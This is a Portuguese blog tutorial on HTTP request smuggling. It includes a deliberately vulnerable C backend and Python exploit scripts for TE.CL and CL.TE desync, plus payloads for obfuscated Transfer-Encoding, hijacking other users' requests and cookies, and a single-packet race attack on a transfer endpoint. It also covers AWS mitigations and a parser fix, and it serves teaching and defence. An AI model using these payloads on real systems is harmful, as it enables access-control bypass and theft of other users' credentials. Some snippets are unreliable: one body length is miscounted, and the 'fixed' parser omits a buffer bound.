---
title: "HTTP Request Smuggling: Contrabandeando Requisições na Frente do Proxy"
published: false
tags: [request-smuggling, web, http]
---

# HTTP Request Smuggling: Contrabandeando Requisições na Frente do Proxy

## Introdução

Em 2005, Watchfire publicou um paper chamado **"HTTP Request Smuggling"** que descrevia uma classe de vulnerabilidade que, na época, pouca gente levou a sério. A ideia era simples e elegante: se dois componentes HTTP (um proxy e um backend) discordam sobre onde uma requisição termina e a próxima começa, um atacante pode "contrabandear" uma requisição dentro de outra. O proxy vê uma coisa, o backend vê outra. O resultado é devastador.

Esse paper ficou meio esquecido por mais de uma década. Aí em 2019, James Kettle (do PortSwigger) apresentou na DEF CON 27 a talk **"HTTP Desync Attacks: Smashing into the Cell Next Door"** e basicamente ressuscitou essa classe de vulnerabilidade. Ele mostrou que request smuggling não era só um problema teórico, era explorável em produção, em infraestruturas reais, com impacto crítico. Depois, em 2023, ele foi além com **"Smashing the State Machine: The True Potential of Web Race Conditions"** na DEF CON 31, onde expandiu o conceito de desync para race conditions em single-packet attacks, mostrando que a dessincronização entre componentes é um problema muito mais amplo do que se imaginava.

Eu lembro de assistir a talk de 2019 e pensar: "como que isso passou despercebido por tanto tempo?". A beleza do request smuggling é que ele explora algo fundamental, a ambiguidade na interpretação de um protocolo que todo mundo assume que é simples. HTTP parece trivial até você olhar de perto. Aí você descobre que cada implementação parseia de um jeito ligeiramente diferente, e essas diferenças são exploráveis.

No Brasil, conteúdo sobre request smuggling é praticamente inexistente com profundidade real. A maioria dos materiais em português são traduções superficiais dos labs do PortSwigger. Esse artigo é minha tentativa de mudar isso: vamos entender o problema desde o nível do socket TCP, construir um servidor vulnerável em C, explorar na prática, e discutir cenários reais em infraestrutura cloud.

O código completo do lab está no repositório [http-smuggling-lab](https://github.com/renansj/http-smuggling-lab).

### Para quem é este artigo?

- Pentesters que querem entender request smuggling além do "copiar payload do PortSwigger"
- Desenvolvedores backend que precisam entender o que protegem
- Engenheiros de infraestrutura que configuram proxies e load balancers
- Jogadores de CTF que encontram desafios de smuggling

### Pré-requisitos

- Entendimento básico do protocolo HTTP/1.1
- Familiaridade com C (vamos construir um servidor vulnerável)
- Python 3 (para os exploits)
- Curiosidade sobre como proxies e backends se comunicam

### Ambiente de laboratório

```
$ uname -a
Linux kali 6.19.11+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.11-1kali1 (2026-04-09) x86_64 GNU/Linux

$ gcc --version
gcc (Debian 15.2.0-16) 15.2.0

$ python3 --version
Python 3.13.12
```

---

## 1. O Problema Fundamental: Como HTTP Delimita Requisições

HTTP/1.1 é um protocolo text-based que roda sobre TCP. TCP é um stream de bytes, não tem conceito de "mensagens". Quem define onde uma mensagem HTTP começa e termina é o **parser HTTP** de cada componente.

Numa arquitetura moderna, uma requisição HTTP passa por múltiplos componentes antes de chegar ao código da aplicação:

```
Cliente → CDN → Load Balancer → Reverse Proxy → Backend
```

Cada um desses componentes tem seu próprio parser HTTP. E aqui está o problema: **se dois parsers discordam sobre o tamanho do body de uma requisição, os bytes "sobrando" do ponto de vista de um deles são interpretados como o início da próxima requisição**.

### Content-Length vs Transfer-Encoding

HTTP/1.1 tem duas formas de indicar o tamanho do body:

**Content-Length**: um número fixo de bytes.
```http
POST /api HTTP/1.1
Host: exemplo.com
Content-Length: 13

{"user":"bob"}
```

**Transfer-Encoding: chunked**: o body é dividido em chunks, cada um prefixado com seu tamanho em hexadecimal, terminando com um chunk de tamanho 0.
```http
POST /api HTTP/1.1
Host: exemplo.com
Transfer-Encoding: chunked

d
{"user":"bob"}
0

```

O `d` é 13 em hexadecimal (tamanho do chunk). O `0` indica fim dos chunks.

### A RFC e a Ambiguidade

A RFC 7230 (seção 3.3.3) diz claramente:

> If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length.

Ou seja: se ambos estão presentes, **Transfer-Encoding tem prioridade**. O problema é que nem todo mundo implementa isso corretamente. Alguns backends ignoram Transfer-Encoding e usam Content-Length. Outros fazem o oposto. E quando um proxy e um backend discordam, temos request smuggling.

### As Três Variantes

| Variante | Frontend (proxy) usa | Backend usa |
|----------|---------------------|-------------|
| **CL.TE** | Content-Length | Transfer-Encoding |
| **TE.CL** | Transfer-Encoding | Content-Length |
| **TE.TE** | Transfer-Encoding | Transfer-Encoding (mas com obfuscação) |

Neste artigo vamos focar em **TE.CL**: o proxy prioriza Transfer-Encoding (comportamento correto segundo a RFC) e o backend prioriza Content-Length (comportamento incorreto, mas comum em implementações legadas).

---

## 2. Visualizando o Desync

Antes de mergulhar no código, vamos entender visualmente o que acontece. Imagine a seguinte requisição enviada por um atacante:

```http
POST / HTTP/1.1
Host: alvo.com
Content-Length: 4
Transfer-Encoding: chunked

28
GET /admin HTTP/1.1
Host: alvo.com

0

```

### O que o proxy vê (prioriza Transfer-Encoding):

```
Requisição 1:
  POST / HTTP/1.1
  Body (chunked): chunk de 0x28=40 bytes contendo "GET /admin HTTP/1.1\r\nHost: alvo.com\r\n\r\n"
  Chunk final: 0

→ Encaminha TUDO ao backend (headers + body chunked completo)
```

O proxy considera que é uma única requisição POST com body em chunked encoding. Ele encaminha tudo ao backend numa única conexão TCP.

### O que o backend vê (prioriza Content-Length):

```
Requisição 1:
  POST / HTTP/1.1
  Body: "28\r\n" (4 bytes, conforme Content-Length: 4)

Requisição 2 (bytes restantes no buffer TCP):
  GET /admin HTTP/1.1
  Host: alvo.com
```

O backend lê apenas 4 bytes de body (o valor de Content-Length). Os bytes restantes, que contêm `GET /admin HTTP/1.1`, ficam no buffer TCP e são interpretados como **uma nova requisição independente**.

### O diagrama do ataque:

```
                    Conexão TCP (keep-alive)
                    ┌─────────────────────────────────────────┐
                    │                                         │
Cliente ──────────► │  PROXY (TE)  ──────────►  BACKEND (CL) │
                    │                                         │
                    │  Vê: 1 requisição       Vê: 2 requisições │
                    │  POST / (chunked body)  POST / (4 bytes)  │
                    │                         GET /admin         │
                    └─────────────────────────────────────────┘
```

Isso é o **desync**: proxy e backend estão dessincronizados sobre o estado da conexão. O proxy acha que processou uma requisição. O backend processou duas. A segunda requisição foi "contrabandeada" (smuggled) pelo atacante.

---

## 3. Construindo um Backend Vulnerável em C

Pra entender de verdade como o smuggling funciona, nada melhor do que construir um servidor HTTP vulnerável do zero. Vamos escrever um backend em C que propositalmente prioriza Content-Length quando ambos os headers estão presentes.

### Por que C?

Porque é onde você vê o problema no nível mais baixo. Sem abstrações, sem frameworks. Só bytes entrando num socket, sendo parseados, e virando requisições HTTP. É aqui que o bug mora.

### O código do backend

O código completo está em [github.com/renansj/http-smuggling-lab/backend.c](https://github.com/renansj/http-smuggling-lab/blob/main/backend.c). Vou destacar as partes relevantes.

A struct que guarda o resultado do parsing:

```c
typedef struct {
    char method[16];
    char path[256];
    int  content_length;        /* valor de Content-Length (-1 se ausente) */
    int  has_transfer_encoding; /* 1 se Transfer-Encoding: chunked */
    char body[MAX_REQUEST];
    int  body_len;
} http_request_t;
```

### A função de parsing: onde mora o bug

```c
/* Parseia requisição HTTP. Retorna bytes consumidos ou -1 se incompleta. */
int parse_request(const char *raw, int raw_len, http_request_t *req) {
    memset(req, 0, sizeof(*req));
    req->content_length = -1;

    const char *header_end = strstr(raw, "\r\n\r\n");
    if (!header_end) return -1;

    int header_len = (header_end - raw) + 4;
    sscanf(raw, "%15s %255s", req->method, req->path);

    /* Extrair Content-Length e Transfer-Encoding */
    const char *line = strstr(raw, "\r\n") + 2;
    while (line < header_end) {
        const char *next = strstr(line, "\r\n");
        if (!next) break;

        if (strncasecmp(line, "Content-Length:", 15) == 0)
            req->content_length = atoi(line + 15);

        if (strncasecmp(line, "Transfer-Encoding:", 18) == 0) {
            const char *val = line + 18;
            while (*val == ' ') val++;
            if (strncasecmp(val, "chunked", 7) == 0)
                req->has_transfer_encoding = 1;
        }
        line = next + 2;
    }

    /*
     * BUG INTENCIONAL: prioriza Content-Length sobre Transfer-Encoding.
     * Um proxy RFC-compliant na frente vai usar TE para delimitar o body,
     * encaminhando mais bytes do que este backend consome. Os bytes
     * excedentes ficam no buffer e viram a próxima requisição.
     */
    if (req->content_length >= 0) {
        int available = raw_len - header_len;
        int to_read = req->content_length < available ? req->content_length : available;
        if (to_read > (int)sizeof(req->body) - 1) to_read = sizeof(req->body) - 1;
        memcpy(req->body, raw + header_len, to_read);
        req->body_len = to_read;
        return header_len + req->content_length;
    }

    if (req->has_transfer_encoding) {
        /* fallback: parsear chunked */
        const char *p = raw + header_len;
        int total = 0;
        while (1) {
            int chunk_size = (int)strtol(p, NULL, 16);
            if (chunk_size == 0) break;
            p = strstr(p, "\r\n") + 2;
            if (total + chunk_size < (int)sizeof(req->body)) {
                memcpy(req->body + total, p, chunk_size);
                total += chunk_size;
            }
            p += chunk_size + 2;
        }
        req->body_len = total;
        const char *end = strstr(p, "\r\n");
        return (end + 2) - raw;
    }

    return header_len;
}
```

O ponto crítico é o `if (req->content_length >= 0)`. Quando Content-Length está presente, o backend **sempre** usa ele, mesmo que Transfer-Encoding também esteja. Isso viola a RFC, mas é um padrão que aparece em implementações reais (versões antigas de Gunicorn, servidores custom, appliances legados, algumas versões de IIS).

A função retorna o número de bytes "consumidos". O handler remove esses bytes do buffer e tenta parsear o que sobrou como uma nova requisição. É exatamente aí que a requisição smuggled aparece.

### O handler de conexão (keep-alive)

```c
void *handle_connection(void *arg) {
    int fd = *(int *)arg;
    free(arg);

    char buf[MAX_REQUEST];
    int buf_used = 0;

    while (1) {
        int n = read(fd, buf + buf_used, sizeof(buf) - buf_used - 1);
        if (n <= 0) break;
        buf_used += n;
        buf[buf_used] = '\0';

        while (buf_used > 0) {
            http_request_t req;
            int consumed = parse_request(buf, buf_used, &req);
            if (consumed <= 0) break;

            printf("[BACKEND] %s %s (CL=%d, TE=%s, body=%d bytes)\n",
                   req.method, req.path, req.content_length,
                   req.has_transfer_encoding ? "chunked" : "none",
                   req.body_len);

            if (strcmp(req.path, "/admin") == 0)
                send_response(fd, 200, "OK",
                    "=== PAINEL ADMIN ===\nAcesso administrativo concedido.\n");
            else if (strcmp(req.path, "/") == 0)
                send_response(fd, 200, "OK", "Bem-vindo ao backend.\n");
            else
                send_response(fd, 404, "Not Found", "Nao encontrado.\n");

            int remaining = buf_used - consumed;
            if (remaining > 0) memmove(buf, buf + consumed, remaining);
            buf_used = remaining;
        }
    }

    close(fd);
    return NULL;
}
```

O loop `while (buf_used > 0)` é fundamental. Ele tenta parsear **múltiplas requisições** do mesmo buffer TCP. Isso é o comportamento correto para HTTP keep-alive, mas é exatamente esse comportamento que permite o smuggling: quando o parser consome menos bytes do que o proxy enviou, o "lixo" restante vira uma nova requisição.

### Compilar e rodar

```bash
$ gcc -o backend backend.c -lpthread
$ ./backend 9090
[BACKEND] Porta 9090, vulneravel a TE.CL desync
```

---

## 4. Explorando o Desync na Prática

Agora que temos o backend vulnerável rodando, vamos explorar. O exploit usa sockets raw em Python, nada de `requests` ou abstrações que normalizam os headers. Precisamos de controle total sobre os bytes enviados.

### O exploit

```python
#!/usr/bin/env python3
"""
Demonstração de HTTP Request Smuggling (TE.CL)
Uso: python3 smuggle_demo.py [host] [porta]
"""

import socket
import sys
import time


def demo_smuggle(host, port):
    smuggled = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"

    # Empacotar como chunk
    chunk_hex = format(len(smuggled), 'x').encode()
    chunked_body = chunk_hex + b"\r\n" + smuggled + b"\r\n" + b"0\r\n\r\n"

    # CL menor que o body real: backend consome só isso, resto vira nova req
    cl = len(chunk_hex) + 2  # consome apenas o chunk header "XX\r\n"

    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Length: " + str(cl).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        + chunked_body
    )

    print(f"[*] Content-Length: {cl} (backend le so isso)")
    print(f"[*] Body real:     {len(chunked_body)} bytes")
    print(f"[*] Excedente:     {len(chunked_body) - cl} bytes → GET /admin")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect((host, port))
    sock.sendall(payload)
    time.sleep(0.5)

    data = sock.recv(8192)
    sock.close()

    responses = [b"HTTP/1.1 " + r for r in data.split(b"HTTP/1.1 ") if r]
    print(f"\n[*] Respostas recebidas: {len(responses)}")
    for i, resp in enumerate(responses):
        status = resp.split(b"\r\n")[0].decode()
        body_idx = resp.find(b"\r\n\r\n")
        body = resp[body_idx+4:].decode().strip() if body_idx > 0 else ""
        print(f"  [{i+1}] {status}")
        print(f"      {body}")

    if any(b"PAINEL ADMIN" in r for r in responses):
        print("\n[+] SMUGGLING CONFIRMADO")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9090
    demo_smuggle(host, port)
```

### Executando

```
$ python3 smuggle_demo.py 127.0.0.1 9090
[*] Content-Length: 4 (backend le so isso)
[*] Body real:     51 bytes
[*] Excedente:     47 bytes → GET /admin

[*] Respostas recebidas: 3
  [1] HTTP/1.1 200 OK
      Bem-vindo ao backend.
  [2] HTTP/1.1 200 OK
      === PAINEL ADMIN ===
      Acesso administrativo concedido.
  [3] HTTP/1.1 404 Not Found
      Nao encontrado.

[+] SMUGGLING CONFIRMADO
```

### O que aconteceu, byte a byte

Vamos dissecar o payload:

```
POST / HTTP/1.1\r\n            ← request line
Host: localhost\r\n             ← header
Content-Length: 4\r\n           ← backend usa ESTE
Transfer-Encoding: chunked\r\n ← proxy usaria ESTE
\r\n                            ← fim dos headers
28\r\n                          ← [4 bytes] chunk header (0x28 = 40)
GET /admin HTTP/1.1\r\n         ← ┐
Host: localhost\r\n              ← ├─ 40 bytes de chunk data
\r\n                             ← ┘
\r\n                            ← CRLF pós-chunk
0\r\n                           ← chunk final
\r\n                            ← trailer
```

O backend lê os headers, vê `Content-Length: 4`, e consome exatamente 4 bytes de body: `28\r\n`. Pronto, primeira requisição processada. Ele remove esses bytes do buffer e tenta parsear o que sobrou:

```
GET /admin HTTP/1.1\r\n
Host: localhost\r\n
\r\n
\r\n0\r\n\r\n
```

Isso começa com `GET /admin HTTP/1.1`, uma requisição HTTP válida! O backend parseia e responde. A terceira resposta (404) é o lixo residual do chunked framing (`0\r\n\r\n`) que o backend tenta parsear como mais uma requisição.

### Log do backend confirmando

```
[BACKEND] POST / (CL=4, TE=chunked, body=4 bytes)
[BACKEND] GET /admin (CL=-1, TE=none, body=0 bytes)
```

Duas requisições processadas a partir de um único envio TCP. O backend não tem como saber que o `GET /admin` foi contrabandeado. Pra ele, é uma requisição legítima que chegou na mesma conexão keep-alive.

---

## 5. O Cenário Real: Proxy + Backend

No exemplo anterior, enviamos direto ao backend. Mas no mundo real, o atacante não tem acesso direto ao backend. Ele fala com o proxy. O proxy é quem decide o que encaminhar. Vamos adicionar o proxy ao cenário.

### O proxy (RFC-compliant)

O proxy segue a RFC corretamente: quando vê `Transfer-Encoding: chunked`, ele usa o chunked framing para determinar onde o body termina. Ele ignora `Content-Length` nesse caso.

O código completo está em [proxy.c](https://github.com/renansj/http-smuggling-lab/blob/main/proxy.c). A função chave:

```c
/* Determina tamanho do body priorizando Transfer-Encoding (RFC compliant). */
int get_body_length(const char *headers, int header_len,
                    const char *body, int body_available, int *chunked) {
    *chunked = 0;

    const char *te = strcasestr(headers, "Transfer-Encoding:");
    if (te && te < headers + header_len) {
        const char *val = te + 18;
        while (*val == ' ') val++;
        if (strncasecmp(val, "chunked", 7) == 0) {
            *chunked = 1;
            return find_chunked_end(body, body_available);
        }
    }

    const char *cl = strcasestr(headers, "Content-Length:");
    if (cl && cl < headers + header_len)
        return atoi(cl + 15);

    return 0;
}
```

O proxy lê o body chunked completo (até `0\r\n\r\n`), e encaminha **tudo** (headers originais + body) ao backend numa conexão keep-alive. O backend recebe os mesmos headers (incluindo ambos `Content-Length` e `Transfer-Encoding`), mas usa `Content-Length` para decidir quanto body ler.

### O fluxo completo do ataque

```
1. Atacante → Proxy:
   POST / HTTP/1.1
   Content-Length: 4
   Transfer-Encoding: chunked

   28\r\nGET /admin...\r\n0\r\n\r\n

2. Proxy parseia:
   Vê TE:chunked → lê chunks → chunk de 0x28 bytes → chunk final 0
   Body completo. Encaminha ao backend.

3. Proxy → Backend (mesma conexão TCP keep-alive):
   [headers originais + body chunked completo]

4. Backend parseia:
   Vê CL:4 → lê 4 bytes de body ("28\r\n")
   Primeira requisição processada.
   Buffer restante: "GET /admin HTTP/1.1\r\n..."
   Parseia como SEGUNDA requisição.

5. Próxima requisição legítima de OUTRO usuário:
   O proxy encaminha na mesma conexão keep-alive
   Mas o backend já processou o GET /admin
   A resposta do /admin vai para o usuário errado!
```

### Por que isso é devastador

O ponto 5 é o que torna request smuggling crítico em produção. Em infraestruturas reais, o proxy mantém um **pool de conexões** com o backend. Múltiplos clientes compartilham essas conexões. Se o atacante envenena o buffer de uma conexão do pool, a **próxima requisição de qualquer usuário** naquela conexão recebe a resposta da requisição smuggled.

Isso significa que o atacante pode:
- Fazer outros usuários acessarem endpoints que não deveriam
- Roubar respostas destinadas a outros usuários
- Injetar headers em requisições de terceiros
- Bypassar controles de acesso no proxy (WAF, autenticação)
- Envenenar cache com conteúdo malicioso

---

## 6. Variante CL.TE

Até agora vimos TE.CL (proxy usa TE, backend usa CL). A variante inversa, **CL.TE**, funciona quando o proxy usa Content-Length e o backend usa Transfer-Encoding.

### Como funciona

```http
POST / HTTP/1.1
Host: alvo.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: alvo.com

```

**Proxy (usa CL)**: lê 30 bytes de body. Isso inclui `0\r\n\r\nGET /admin...` (os primeiros 30 bytes após os headers). Encaminha tudo ao backend.

**Backend (usa TE)**: vê `Transfer-Encoding: chunked`, parseia chunks. Encontra chunk de tamanho 0 imediatamente, body vazio. Primeira requisição processada. O que sobra no buffer (`GET /admin HTTP/1.1\r\n...`) é a segunda requisição.

### Payload CL.TE

```python
def build_clte_payload():
    """CL.TE: proxy usa Content-Length, backend usa Transfer-Encoding."""

    smuggled = b"GET /admin HTTP/1.1\r\nHost: alvo.com\r\n\r\n"

    # Body que o proxy vai encaminhar (ele lê CL bytes):
    # "0\r\n\r\n" (fim do chunked) + requisição smuggled
    body = b"0\r\n\r\n" + smuggled

    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: alvo.com\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        + body
    )
    return payload
```

### Qual variante é mais comum?

Na prática, **CL.TE** é mais comum em infraestruturas com:
- Frontend: HAProxy, AWS ALB, Cloudflare (usam CL por padrão em certos modos)
- Backend: Node.js (Express), Gunicorn, que priorizam TE

**TE.CL** aparece quando:
- Frontend: Nginx, Caddy (priorizam TE corretamente)
- Backend: servidores legados, appliances, implementações custom

A variante **TE.TE** explora diferenças na forma como cada componente parseia o header Transfer-Encoding quando ele está obfuscado:

```http
Transfer-Encoding: chunked
Transfer-Encoding : chunked      (espaço antes do :)
Transfer-Encoding: xchunked
Transfer-Encoding: chunked\x00   (null byte)
Transfer-Encoding:
 chunked                          (line folding)
```

Cada implementação reage de forma diferente a essas variações. Se uma aceita e outra rejeita, temos desync.

---

## 7. Impacto Real: O Que um Atacante Consegue

Request smuggling não é uma vulnerabilidade que você explora isoladamente. O poder real está no que você faz **depois** de conseguir o desync.

### 7.1 Bypass de controles de acesso

Se o proxy implementa controle de acesso (bloqueia `/admin` para IPs externos, por exemplo), o atacante pode smugglar uma requisição `GET /admin` que chega ao backend **sem passar pela validação do proxy**.

```
Proxy: "Essa requisição é POST /, permitido."
Backend: "Recebi POST / e GET /admin, processo ambos."
```

O proxy nunca viu o `GET /admin`. Ele foi injetado diretamente no buffer do backend.

### 7.2 Envenenamento de cache (Cache Poisoning)

Se existe um cache entre o proxy e o cliente (CDN, Varnish, etc.), o atacante pode fazer o cache armazenar a resposta errada para uma URL legítima. Se a próxima requisição legítima na mesma conexão é `GET /static/app.js`, o cache pode armazenar a resposta da requisição smuggled como a resposta canônica para `/static/app.js`. Todos os usuários subsequentes recebem o conteúdo envenenado.

### 7.3 Roubo de credenciais (Request Hijacking)

O atacante pode smugglar uma requisição parcial que "absorve" a próxima requisição de outro usuário:

```python
smuggled = (
    b"POST /log HTTP/1.1\r\n"
    b"Host: alvo.com\r\n"
    b"Content-Length: 500\r\n"  # vai ler 500 bytes do próximo request
    b"\r\n"
)
```

O backend vê `POST /log` com `Content-Length: 500`. Ele espera 500 bytes de body. Os próximos 500 bytes que chegam na conexão são a requisição do próximo usuário! Incluindo cookies, tokens de autenticação, e qualquer dado sensível nos headers.

### 7.4 Reflected XSS → Stored XSS

Se o alvo tem um XSS refletido em algum parâmetro, o atacante pode usar smuggling para transformá-lo em stored. Ele smuggla uma requisição com o payload XSS que é "servida" para o próximo usuário que acessa a página, sem que a vítima precise clicar em nenhum link.

### 7.5 Bypass de WAF

Web Application Firewalls inspecionam requisições no nível do proxy. Se o WAF vê `POST /` com body inofensivo, ele permite. Mas o backend processa `GET /admin?cmd=whoami` que estava escondido dentro do body. O WAF nunca viu essa segunda requisição.

---

## 8. HTTP/2 Desync: A Evolução

Em 2021-2022, James Kettle publicou pesquisa sobre **HTTP/2 request smuggling** (H2.CL e H2.TE). O HTTP/2 usa framing binário, cada requisição é um stream independente com length fields explícitos. Em teoria, isso eliminaria o problema de delimitação. Na prática, não.

### O problema: HTTP/2 → HTTP/1.1 downgrade

A maioria das infraestruturas faz **downgrade** de HTTP/2 para HTTP/1.1 entre o proxy e o backend:

```
Cliente ──HTTP/2──► Proxy/CDN ──HTTP/1.1──► Backend
```

O proxy recebe a requisição em HTTP/2 (onde o body tem tamanho explícito no frame), converte para HTTP/1.1, e adiciona um header `Content-Length`. Se o atacante consegue manipular os headers durante essa conversão, pode criar discrepâncias.

### H2.CL (HTTP/2 → Content-Length desync)

Em HTTP/2, o atacante pode enviar um header `Content-Length` que **não corresponde** ao tamanho real do body no frame DATA. O proxy HTTP/2 pode não validar essa consistência. Quando ele converte para HTTP/1.1, o `Content-Length` incorreto é preservado, e o backend usa esse valor para delimitar o body.

```python
# Pseudo-código: requisição HTTP/2 com CL inconsistente
headers = [
    (":method", "POST"),
    (":path", "/"),
    (":authority", "alvo.com"),
    ("content-length", "0"),  # CL diz 0 bytes
]
# Mas o frame DATA contém:
body = b"GET /admin HTTP/1.1\r\nHost: alvo.com\r\n\r\n"
```

O proxy HTTP/2 encaminha como HTTP/1.1 com `Content-Length: 0` mas com body presente. O backend lê CL=0 bytes de body, e o body inteiro vira a próxima requisição.

### CONTINUATION Flood (2024)

Em 2024, pesquisadores descobriram que frames CONTINUATION em HTTP/2 podiam ser abusados para DoS e, em alguns casos, para smuggling. O frame CONTINUATION permite enviar headers fragmentados em múltiplos frames. Algumas implementações não limitam o número de frames CONTINUATION, permitindo:

- DoS por exaustão de memória (CVE-2024-27316 no Apache httpd)
- Bypass de limites de tamanho de header
- Confusão no parser de headers que pode levar a desync

---

## 9. Conexão com Race Conditions: "Smashing the State Machine"

Em 2023, James Kettle apresentou na DEF CON 31 a talk **"Smashing the State Machine: The True Potential of Web Race Conditions"**. Essa pesquisa expandiu o conceito de desync de uma forma que eu acho brilhante: ele mostrou que request smuggling e race conditions são manifestações do mesmo problema fundamental, a **dessincronização de estado entre componentes**.

### Single-packet attack

A técnica central da pesquisa é o **single-packet attack**: enviar múltiplas requisições HTTP no mesmo pacote TCP para garantir que elas cheguem ao servidor simultaneamente, eliminando jitter de rede. Isso maximiza a janela de race condition.

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("alvo.com", 443))

# Construir N requisições completas
requests = b""
for i in range(20):
    requests += (
        f"POST /transfer HTTP/1.1\r\n"
        f"Host: alvo.com\r\n"
        f"Content-Length: 30\r\n"
        f"\r\n"
        f"from=alice&to=bob&amount=1000"
    ).encode()

# Enviar TUDO em um único send(), um único pacote TCP
sock.sendall(requests)
```

Todas as 20 requisições chegam no mesmo instante. Se o endpoint `/transfer` tem uma race condition (verifica saldo → debita sem lock), o atacante pode transferir 20x o valor com saldo para apenas 1x.

### A conexão com smuggling

O insight de Kettle é que smuggling e race conditions exploram o mesmo vetor: **o gap entre como o sistema deveria processar requisições (sequencialmente, com estado consistente) e como ele realmente processa (concorrentemente, com estado potencialmente inconsistente)**.

Request smuggling dessincroniza o **parsing** entre componentes.
Race conditions dessincronizam o **estado** entre operações.

Ambos exploram o fato de que sistemas distribuídos são difíceis de manter consistentes, especialmente sob carga adversarial.

### Referências

- Paper: Kettle, J. "Smashing the State Machine: The True Potential of Web Race Conditions" (2023)
- Talk DEF CON 31: [YouTube](https://www.youtube.com/watch?v=tKJzsaB1ZvI)
- Blog post: [PortSwigger Research](https://portswigger.net/research/smashing-the-state-machine)

---

## 10. Mitigação de Desync na AWS

Se você opera infraestrutura na AWS, request smuggling é um risco real e documentado. A AWS teve múltiplos advisories sobre isso.

### AWS Application Load Balancer (ALB)

O ALB é o componente mais comum na frente de aplicações web na AWS. Ele faz terminação HTTP e encaminha para targets (EC2, ECS, Lambda).

**Modos de mitigação de desync:**

| Modo | Comportamento |
|------|---------------|
| **Defensive** (padrão) | Bloqueia requisições ambíguas (CL+TE simultâneos, CL duplicado, TE malformado) |
| **Strictest** | Bloqueia tudo que o defensive bloqueia + requisições com headers que podem causar desync em backends |
| **Monitor** | Permite tudo mas loga requisições suspeitas no CloudWatch |

```bash
# Verificar modo atual do ALB
aws elbv2 describe-load-balancer-attributes \
  --load-balancer-arn <arn> \
  --query "Attributes[?Key=='routing.http.desync_mitigation_mode'].Value"

# Configurar modo strictest
aws elbv2 modify-load-balancer-attributes \
  --load-balancer-arn <arn> \
  --attributes Key=routing.http.desync_mitigation_mode,Value=strictest
```

**Recomendação**: usar `strictest` em produção. O modo `defensive` ainda permite algumas requisições ambíguas que backends específicos podem interpretar de forma insegura.

### CloudFront

O CloudFront (CDN da AWS) também é suscetível a desync quando faz proxy para origins HTTP/1.1.

Mitigações:
- Desde 2022, o CloudFront normaliza headers `Transfer-Encoding` e rejeita requisições com CL+TE simultâneos
- Usar HTTP/2 entre CloudFront e origin (quando possível) elimina a classe CL/TE
- Configurar `Origin Shield` adiciona uma camada extra de normalização

### API Gateway

O API Gateway da AWS é menos suscetível porque parseia e reconstrói a requisição completamente (não faz proxy transparente), valida Content-Length contra o body real, e rejeita Transfer-Encoding em requisições para Lambda.

Mas atenção: se o API Gateway faz proxy para um backend HTTP (HTTP integration), o risco volta a existir dependendo da configuração.

### Cenário de ataque real na AWS

```
Internet → CloudFront → ALB (defensive mode) → ECS (Gunicorn)
```

Se o Gunicorn no ECS tem uma versão que prioriza TE diferente do ALB:
1. Atacante envia requisição com TE obfuscado (`Transfer-Encoding: xchunked`)
2. ALB no modo `defensive` pode permitir (não é CL+TE explícito)
3. Gunicorn pode interpretar `xchunked` como `chunked` (ou não)
4. Se houver discordância → desync

**Fix**: modo `strictest` no ALB + atualizar Gunicorn + usar HTTP/2 entre ALB e target.

### Checklist de mitigação AWS

- [ ] ALB em modo `strictest` para desync mitigation
- [ ] CloudFront com HTTP/2 para origin
- [ ] Backend atualizado (Gunicorn ≥ 20.1.0, Nginx ≥ 1.21.1, Node.js ≥ 18.x)
- [ ] Não usar HTTP/1.0 entre componentes
- [ ] Monitorar métricas `DesyncMitigationMode_NonCompliant_Request_Count` no CloudWatch
- [ ] Testar com ferramentas como `smuggler.py` ou `http-request-smuggler` (extensão Burp)
- [ ] Se possível, usar HTTP/2 end-to-end (elimina a classe CL/TE completamente)

---

## 11. Como Corrigir o Backend Vulnerável

Voltando ao nosso `backend.c`, como corrigir o bug?

### A correção

```c
/*
 * parse_request CORRIGIDO: prioriza Transfer-Encoding
 * conforme RFC 7230 §3.3.3
 */
int parse_request_fixed(const char *raw, int raw_len, http_request_t *req) {
    /* ... parsing de headers igual ... */

    /*
     * CORREÇÃO: Transfer-Encoding tem prioridade ABSOLUTA.
     * Se ambos estão presentes, rejeitar a requisição (400 Bad Request).
     */
    if (req->has_transfer_encoding) {
        if (req->content_length >= 0) {
            return -2;  /* 400 Bad Request: requisição ambígua */
        }

        /* Parsear chunked normalmente */
        const char *p = raw + header_len;
        int total = 0;
        while (1) {
            int chunk_size = (int)strtol(p, NULL, 16);
            if (chunk_size == 0) break;
            p = strstr(p, "\r\n") + 2;
            if (total + chunk_size < (int)sizeof(req->body)) {
                memcpy(req->body + total, p, chunk_size);
                total += chunk_size;
            }
            p += chunk_size + 2;
        }
        req->body_len = total;
        const char *end = strstr(p, "\r\n");
        return (end + 2) - raw;
    }

    if (req->content_length >= 0) {
        int available = raw_len - header_len;
        int to_read = req->content_length < available ? req->content_length : available;
        memcpy(req->body, raw + header_len, to_read);
        req->body_len = to_read;
        return header_len + req->content_length;
    }

    return header_len;
}
```

### Princípios da correção

1. **Transfer-Encoding sempre tem prioridade** sobre Content-Length (RFC 7230 §3.3.3)
2. **Melhor ainda: rejeitar requisições ambíguas.** Se ambos estão presentes, retornar 400 Bad Request. Não existe caso legítimo onde um cliente precisa enviar ambos.
3. **Validar consistência.** Se Content-Length está presente, verificar que o body recebido tem exatamente esse tamanho.
4. **Normalizar antes de encaminhar.** Se você é um proxy, remova o header redundante antes de encaminhar ao backend.

### Mitigações em nível de infraestrutura

| Camada | Mitigação |
|--------|-----------|
| **Proxy/LB** | Rejeitar requisições com CL+TE simultâneos |
| **Proxy/LB** | Normalizar TE header (remover espaços, variações) |
| **Proxy/LB** | Usar HTTP/2 para backend (elimina a classe) |
